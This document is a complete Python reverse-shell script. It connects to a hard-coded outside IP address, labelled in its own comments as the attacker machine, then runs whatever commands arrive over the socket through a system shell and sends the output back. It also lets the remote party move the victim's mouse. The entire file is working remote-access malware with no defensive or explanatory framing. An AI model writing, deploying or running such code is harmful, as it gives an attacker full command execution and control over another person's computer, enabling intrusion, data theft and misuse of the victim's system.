import socket
import subprocess
import pyautogui

def connect_to_attacker():
    attacker_host = '49.36.234.234'  # Replace with the IP address of the attacker machine
    attacker_port = 1234  # Port used by the attacker machine

    attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    attacker_socket.connect((attacker_host, attacker_port))

    print('Connection established with the attacker.')

    while True:
        command = attacker_socket.recv(1024).decode()
        if command.lower() == 'exit':
            break

        if command.lower().startswith('mouse'):
            _, x, y = command.split()
            move_mouse(int(x), int(y))
            response = f'Mouse moved to ({x}, {y})'
        else:
            response = execute_command(command)

        attacker_socket.send(response.encode())

    attacker_socket.close()


def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except Exception as e:
        return str(e)


def move_mouse(x, y):
    pyautogui.moveTo(x, y)


if __name__ == '__main__':
    connect_to_attacker()
